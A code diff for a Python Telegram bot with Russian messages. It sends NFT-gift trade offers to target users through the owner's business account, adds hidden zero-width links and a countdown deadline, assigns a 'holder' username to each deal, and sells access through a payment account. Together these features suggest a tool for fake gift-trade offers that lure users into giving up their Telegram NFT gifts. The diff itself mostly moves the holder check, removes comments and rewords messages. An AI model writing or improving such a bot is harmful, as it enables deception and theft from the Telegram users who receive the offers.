@@ -42,7 +42,7 @@ def btn_url(text, url, emoji):
 # ==================== ХРАНИЛИЩА ====================
 deals = {}
 users = {}
-bconns = {}  # user_id -> business_connection_id
+bconns = {}
 allowed = [OWNER_ID]
 wholder = set()
 awgrant = {}
@@ -84,7 +84,6 @@ def gs(uid):
     return users[uid]
 
 def get_owner_bci():
-    """Получить business connection ID владельца (всегда отправляем от его имени)"""
     return bconns.get(OWNER_ID)
 
 def sm(cid, txt, kb=None, bci=None):
@@ -189,12 +188,22 @@ def handle_message(msg):
     uid = msg["from"]["id"]
     ci = msg.get("business_connection_id")
 
-    # Сохраняем business connection
     if ci:
         bconns[uid] = ci
         print(f"💾 Saved bci for user {uid}: {ci}")
 
     txt = (msg.get("text") or "").strip()
+
+    # ПРОВЕРКА WHOLDER ДО проверки на /
+    if uid in wholder:
+        un = txt.lstrip("@").lower()
+        if un and " " not in un:
+            gs(uid)["hold"] = un
+            wholder.discard(uid)
+            sm(cid, f"✅ Держатель изменён на @{un}", bci=ci)
+        else:
+            sm(cid, "❌ Неверный формат. Напишите username без @", bci=ci)
+        return
 
     if txt.startswith("/") and uid not in allowed:
         sm(cid, f"🔒 <b>Доступ закрыт</b>\n\n💰 <b>@{PAYMENT}</b>", bci=ci)
@@ -248,10 +257,9 @@ def handle_message(msg):
         cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
         did = str(uuid.uuid4())[:8]
         
-        # ВСЕГДА используем bci владельца для отправки от его имени
         owner_bci = get_owner_bci()
         if not owner_bci:
-            sm(cid, "⚠️ <b>Владелец не подключил бизнес-аккаунт!</b>\n\nПодключите через @BotFather → Business → Connect Business Account", bci=ci)
+            sm(cid, "⚠️ <b>Владелец не подключил бизнес-аккаунт!</b>", bci=ci)
             return
 
         deals[did] = {
@@ -264,17 +272,16 @@ def handle_message(msg):
         nl = "https://t.me/nft/" + ni["slug"]
 
         hidden = '<a href="' + nl + '">\u200b</a>'
-        caption = hidden + f"Пользователь <u>{on}</u> готов отдать <b>{pr}</b> {cs}\nза ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
+        caption = hidden + f"Пользователь <u>{on}</u> предлагает <b>{pr}</b> {cs}\nза ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
 
-        # Отправляем от имени владельца через его business connection
         result = sm_nft(tid, caption, nl, kb=okb(did), bci=owner_bci)
         
         if result.get("ok"):
-            sm(cid, "✅ Оффер отправлен от вашего имени", bci=ci)
+            sm(cid, f"✅ Оффер отправлен. Holder: @{s['hold']}", bci=ci)
         else:
             err = result.get("description", "err")
             if "bot was blocked" in err.lower():
-                sm(cid, f"❌ Пользователь заблокировал бота. Оффер не отправлен.", bci=ci)
+                sm(cid, "❌ Пользователь заблокировал бота", bci=ci)
             else:
                 sm(cid, f"❌ Ошибка: {err}", bci=ci)
         return
@@ -367,17 +374,7 @@ def handle_message(msg):
 
     if txt.startswith("/holder"):
         wholder.add(uid)
-        sm(cid, "👑 Username без @", bci=ci)
-        return
-
-    if uid in wholder:
-        un = txt.lstrip("@").lower()
-        if un and " " not in un:
-            gs(uid)["hold"] = un
-            wholder.discard(uid)
-            sm(cid, f"✅ @{un}", bci=ci)
-        else:
-            sm(cid, "❌", bci=ci)
+        sm(cid, "👑 Напишите username держателя БЕЗ @", bci=ci)
         return
 
 def handle_callback(cb):
@@ -451,7 +448,7 @@ def webhook():
         elif "business_connection" in update:
             bc = update["business_connection"]
             bconns[bc["user"]["id"]] = bc["id"]
-            print(f"✅ Business connection saved: user {bc['user']['id']} -> {bc['id']}")
+            print(f"✅ Business connection: {bc['user']['id']} -> {bc['id']}")
     except Exception as e:
         print("Webhook error:", e)
     return jsonify({"ok": True})
